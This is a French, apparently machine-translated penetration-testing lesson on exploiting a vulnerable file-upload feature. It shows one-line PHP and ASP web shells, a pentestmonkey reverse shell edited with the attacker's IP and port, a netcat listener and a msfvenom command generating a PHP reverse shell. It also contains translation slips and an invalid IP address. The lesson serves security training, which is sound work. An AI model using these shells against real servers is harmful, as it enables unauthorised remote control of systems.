Télécharger l'exploitation
===================

* * * * *

La dernière étape de l'exploitation de cette application Web consiste à télécharger le script malveillant dans le même langage que l'application Web, comme un shell Web ou un script shell inversé. Une fois que nous avons téléchargé notre script malveillant et visité son lien, nous devrions pouvoir interagir avec lui pour prendre le contrôle du serveur principal.

* * * * *
 
 Web Shell
----------

Nous pouvons trouver en ligne de nombreux excellents shells Web qui offrent des fonctionnalités utiles, telles que la traversée de répertoires ou le transfert de fichiers. Une bonne option pour `PHP` est [phpbash](https://github.com/Arrexel/phpbash), qui fournit un shell Web semi-interactif de type terminal. De plus, [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) fournit une multitude de shells Web pour différents frameworks et langages, qui peuvent être trouvés dans `/opt/useful/SecLists /Web-Shells` répertoire dans `PwnBox`.

Nous pouvons télécharger n'importe lequel de ces shells Web pour le langage de notre application Web (`PHP` dans notre cas), puis le télécharger via la fonctionnalité de téléchargement vulnérable et visiter le fichier téléchargé pour interagir avec le shell Web. Par exemple, essayons de télécharger `phpbash.php` depuis [phpbash](https://github.com/Arrexel/phpbash) vers notre application Web, puis naviguons jusqu'à son lien en cliquant sur le bouton Télécharger :

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_bash.jpg)

Comme nous pouvons le voir, ce shell Web offre une expérience de type terminal, ce qui facilite l'énumération du serveur principal pour une exploitation ultérieure. Essayez quelques autres shells Web de SecLists et voyez ceux qui répondent le mieux à vos besoins.

* * * * *

Écriture d'un shell Web personnalisé
------------------------

Bien que l'utilisation de shells Web à partir de ressources en ligne puisse offrir une excellente expérience, nous devons également savoir comment écrire manuellement un shell Web simple. En effet, nous n'avons peut-être pas accès aux outils en ligne lors de certains tests d'intrusion, nous devons donc pouvoir en créer un en cas de besoin.

Par exemple, avec les applications Web `PHP` , nous pouvons utiliser la fonction `system()` qui exécute les commandes système et imprime leur sortie, et lui transmettons le paramètre `cmd` avec `$_REQUEST['cmd']`, comme suit :

Code : php

```
<?php system($_REQUEST['cmd']); ?>

```

Si nous écrivons le script ci-dessus dans `shell.php` et que nous le téléchargeons dans notre application Web, nous pouvons exécuter des commandes système avec le paramètre `?cmd=` GET (par exemple `?cmd=id`), comme suit :

![](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_manual_shell.jpg)

Ce n'est peut-être pas aussi facile à utiliser que d'autres shells Web que nous pouvons trouver en ligne, mais il fournit toujours une méthode interactive pour envoyer des commandes et récupérer leur sortie. Cela pourrait être la seule option disponible lors de certains tests d'intrusion Web.

Astuce : Si nous utilisons ce shell Web personnalisé dans un navigateur, il peut être préférable d'utiliser la vue source en cliquant `[CTRL+U]`, car la vue source affiche la sortie de la commande telle qu'elle serait affichée dans le terminal. , sans aucun rendu HTML susceptible d'affecter le formatage de la sortie.

Les shells Web ne sont pas exclusifs à `PHP`, et il en va de même pour les autres frameworks Web, la seule différence étant les fonctions utilisées pour exécuter les commandes système. Pour les applications Web `.NET` , nous pouvons transmettre le paramètre `cmd` avec `request('cmd')` à la fonction `eval()` , et elle doit également exécuter la commande spécifiée dans `?cmd=` et imprimer sa sortie, comme suit :

Code : asp

```
<% eval request('cmd') %>

```

Nous pouvons trouver divers autres shells Web en ligne, dont beaucoup peuvent être facilement mémorisés à des fins de test de pénétration Web. Il convient de noter que "dans certains cas, les shells Web peuvent ne pas fonctionner". Cela peut être dû au fait que le serveur Web empêche l'utilisation de certaines fonctions utilisées par le shell Web (par exemple `system()`), ou à un pare-feu d'application Web, entre autres raisons. Dans ces cas, nous devrons peut-être utiliser des techniques avancées pour contourner ces atténuations de sécurité, mais cela sort du cadre de ce module.

* * * * *

Reverse Shell
--------------

Enfin, voyons comment nous pouvons recevoir des shells inversés via la fonctionnalité de téléchargement vulnérable. Pour ce faire, nous devons commencer par télécharger un script shell inversé dans la langue de l'application Web. Un reverse shell fiable pour `PHP` est le [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) PHP reverse shell. De plus, les mêmes [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) que nous avons mentionnées précédemment contiennent également des scripts shell inversés pour divers langages et frameworks Web, et nous pouvons utiliser n'importe lequel d'entre eux. pour recevoir également une coque inversée.

Téléchargeons l'un des scripts shell inversés ci-dessus, comme [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell), puis ouvrons-le dans un éditeur de texte pour saisir notre `IP` et écouter ` PORT`, auquel le script se connectera. Pour le script `pentestmonkey` , nous pouvons modifier les lignes `49` et `50` et entrer l'IP/PORT de notre machine :

Code : php

```
$ip = 'NOTRE_IP'; // CHANGE ÇA
$port = NOTRE_PORT ; // CHANGE ÇA

```

Ensuite, nous pouvons commencer une`netcat` écouteur sur notre machine (avec le port ci-dessus), chargez notre script sur l'application Web, puis visitez son lien pour exécuter le script et obtenir une connexion shell inversée :

```
dsgsec@htb[/htb]$ nc -lvnp NOTRE_PORT
écoute sur [tout] OUR_PORT ...
connectez-vous à [OUR_IP] depuis (UNKNOWN) [188.166.173.208] 35232
# identifiant
uid=33(www-data) gid=33(www-data) groupes=33(www-data)

```

Comme nous pouvons le constater, nous avons reçu avec succès une connexion du serveur principal qui héberge l'application Web vulnérable, ce qui nous permet d'interagir avec elle pour une exploitation ultérieure. Le même concept peut être utilisé pour d'autres frameworks et langages Web, la seule différence étant le script shell inversé que nous utilisons.

* * * * *

Génération de scripts reverse shell personnalisés
---------------------------------------

Tout comme les shells Web, nous pouvons également créer nos propres scripts shell inversés. Bien qu'il soit possible d'utiliser la même fonction `system` et de lui transmettre une commande shell inversée, cela n'est pas toujours très fiable, car la commande peut échouer pour de nombreuses raisons, comme toute autre commande shell inversée.

C'est pourquoi il est toujours préférable d'utiliser les fonctions de base du framework Web pour se connecter à notre machine. Cependant, cela peut ne pas être aussi facile à mémoriser qu'un script shell Web. Heureusement, des outils comme `msfvenom` peuvent générer un script shell inversé dans de nombreuses langues et peuvent même tenter de contourner certaines restrictions en place. Nous pouvons le faire comme suit pour `PHP` :

```
dsgsec@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
...COUPER...
Taille de la charge utile : 3 033 octets

```

Une fois que notre script `reverse.php` est généré, nous pouvons à nouveau démarrer un écouteur `netcat` sur le port que nous avons spécifié ci-dessus, télécharger le script `reverse.php` et visiter son lien, et nous devrions également recevoir un shell inversé. :

```
dsgsec@htb[/htb]$ nc -lvnp NOTRE_PORT
écoute sur [tout] OUR_PORT ...
connectez-vous à [OUR_IP] depuis (UNKNOWN) [181.151.182.286] 56232
# identifiant
uid=33(www-data) gid=33(www-data) groupes=33(www-data)

```

De même, nous pouvons générer des scripts shell inversés pour plusieurs langages. Nous pouvons utiliser de nombreuses charges utiles reverse shell avec l'indicateur `-p` et spécifier la langue de sortie avec l'indicateur `-f` .

Bien que les shells inversés soient toujours préférés aux shells Web, car ils fournissent la méthode la plus interactive pour contrôler le serveur compromis, ils peuvent ne pas toujours fonctionner et nous devrons peut-être nous fier aux shells Web à la place. Cela peut être dû à plusieurs raisons, comme avoir un pare-feu sur le réseau principal qui empêche les connexions sortantes ou si le serveur Web désactive les fonctions nécessaires pour initier une connexion vers nous.